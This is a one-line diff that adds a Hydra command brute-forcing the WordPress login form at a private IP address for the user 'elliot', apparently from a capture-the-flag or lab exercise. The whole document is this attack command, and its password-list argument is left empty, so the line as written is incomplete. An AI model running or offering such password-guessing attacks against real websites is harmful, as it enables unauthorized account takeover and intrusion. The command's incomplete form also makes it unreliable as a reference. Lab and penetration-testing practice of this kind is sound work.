@@ -1,0 +1,1 @@
+hydra -l elliot -P  172.20.48.124 -V http-form-post "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:F=incorrect"
